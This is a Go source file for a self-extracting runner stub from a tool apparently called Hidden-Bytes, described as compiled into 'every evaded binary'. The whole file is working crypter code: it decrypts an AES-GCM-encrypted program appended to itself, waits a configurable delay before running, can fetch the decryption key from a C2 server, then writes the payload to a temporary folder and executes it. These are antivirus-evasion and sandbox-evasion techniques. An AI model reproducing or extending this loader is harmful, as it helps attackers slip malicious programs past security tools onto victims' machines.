// Self-extracting runner compiled into every evaded binary.
// Reads its own executable, finds the encrypted payload appended
// after itself, enforces the configured delay, decrypts, and runs
// the original program.
//
// Supports two key modes:
//   - Local: key and nonce are in the JSON metadata (legacy / no --c2-url)
//   - Remote: key_id and c2_url are in the metadata; key is fetched from the C2 server
//
// Output layout (read from the end):
//   [stub .exe] [zero padding] [ciphertext] [JSON meta] [metaLen 4B] ["HBX1"]
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"time"
)

const magic = "HBX1"

type meta struct {
	Key           string  `json:"key,omitempty"`
	Nonce         string  `json:"nonce,omitempty"`
	KeyID         string  `json:"key_id,omitempty"`
	C2URL         string  `json:"c2_url,omitempty"`
	Delay         float64 `json:"delay"`
	OriginalName  string  `json:"original_name"`
	OriginalSize  int     `json:"original_size"`
	CiphertextLen int     `json:"ciphertext_len"`
}

type keyResponse struct {
	Key   string `json:"key"`
	Nonce string `json:"nonce"`
}

func main() {
	fmt.Fprintln(os.Stderr, "[INFO] Hidden-Bytes self-extracting runner.")

	exePath, err := os.Executable()
	if err != nil {
		fatal("cannot locate self: %v", err)
	}
	data, err := os.ReadFile(exePath)
	if err != nil {
		fatal("cannot read self: %v", err)
	}

	n := len(data)
	if n < 8 || string(data[n-4:]) != magic {
		fatal("not a valid Hidden-Bytes runner")
	}

	metaLen := int(binary.BigEndian.Uint32(data[n-8 : n-4]))
	if n < 8+metaLen {
		fatal("corrupted runner file")
	}

	var m meta
	if err := json.Unmarshal(data[n-8-metaLen:n-8], &m); err != nil {
		fatal("corrupted metadata: %v", err)
	}

	ctEnd := n - 8 - metaLen
	ctStart := ctEnd - m.CiphertextLen
	if ctStart < 0 {
		fatal("ciphertext extends beyond file")
	}
	ciphertext := data[ctStart:ctEnd]

	if m.Delay > 0 {
		fmt.Fprintf(os.Stderr, "[INFO] Execution delayed by %.0f seconds...\n", m.Delay)
		time.Sleep(time.Duration(m.Delay * float64(time.Second)))
	}

	var key, nonce []byte

	if m.KeyID != "" && m.C2URL != "" {
		fmt.Fprintln(os.Stderr, "[INFO] Fetching key from C2 server...")
		key, nonce, err = fetchKeyFromServer(m.C2URL, m.KeyID)
		if err != nil {
			fatal("cannot retrieve key: %v", err)
		}
		fmt.Fprintln(os.Stderr, "[INFO] Key retrieved from server.")
	} else if m.Key != "" && m.Nonce != "" {
		key, _ = base64.StdEncoding.DecodeString(m.Key)
		nonce, _ = base64.StdEncoding.DecodeString(m.Nonce)
	} else {
		fatal("no key source: metadata has neither key nor key_id")
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		fatal("cipher: %v", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		fatal("gcm: %v", err)
	}
	plaintext, err := gcm.Open(nil, nonce, ciphertext, []byte(magic))
	if err != nil {
		fatal("decryption failed — wrong key or corrupted file")
	}
	if len(plaintext) != m.OriginalSize {
		fatal("size mismatch after decryption")
	}

	fmt.Fprintln(os.Stderr, "[INFO] Binary decrypted successfully.")

	tmpDir, err := os.MkdirTemp("", "hbx-")
	if err != nil {
		fatal("temp dir: %v", err)
	}
	defer os.RemoveAll(tmpDir)

	target := filepath.Join(tmpDir, m.OriginalName)
	if err := os.WriteFile(target, plaintext, 0o755); err != nil {
		fatal("write payload: %v", err)
	}

	fmt.Fprintln(os.Stderr, "[INFO] Target program executed.")

	cmd := exec.Command(target)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stdin
	cmd.Run()
}

func fetchKeyFromServer(c2url, keyID string) ([]byte, []byte, error) {
	resp, err := http.Get(c2url + "/keys/" + keyID)
	if err != nil {
		return nil, nil, fmt.Errorf("cannot reach key server at %s: %w", c2url, err)
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNotFound {
		return nil, nil, fmt.Errorf("key not found on server (may have been burned)")
	}
	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return nil, nil, fmt.Errorf("server returned %d: %s", resp.StatusCode, string(body))
	}

	var kr keyResponse
	if err := json.NewDecoder(resp.Body).Decode(&kr); err != nil {
		return nil, nil, fmt.Errorf("bad response: %w", err)
	}

	key, err := base64.StdEncoding.DecodeString(kr.Key)
	if err != nil {
		return nil, nil, fmt.Errorf("bad key encoding: %w", err)
	}
	nonce, err := base64.StdEncoding.DecodeString(kr.Nonce)
	if err != nil {
		return nil, nil, fmt.Errorf("bad nonce encoding: %w", err)
	}

	return key, nonce, nil
}

func fatal(format string, args ...interface{}) {
	fmt.Fprintf(os.Stderr, "[ERROR] "+format+"\n", args...)
	os.Exit(1)
}
